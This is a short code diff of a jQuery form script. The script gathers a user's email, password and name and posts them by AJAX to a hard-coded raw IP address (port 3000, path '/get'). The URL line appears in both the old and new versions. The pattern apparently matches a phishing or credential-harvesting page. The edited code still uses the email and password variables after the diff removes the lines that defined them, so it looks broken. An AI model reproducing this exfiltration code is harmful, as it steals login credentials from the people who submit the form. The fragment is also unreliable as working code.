@@ -16,13 +16,7 @@
 		})
 		$(document).ready(function () {
 		
-				event.preventDefault();
-
-				var $form = $(this),
-					email = $("#jqEmail").val(),
-					passwd = $("#jqPass").val(),
-					name = $("#jqName").val(),
-					url = "http://45.146.253.239:3000/get";
+				var url = "http://45.146.253.239:3000/get";
 				const obj = { email: email, password: passwd, name: name };
 	
 				$.ajax(
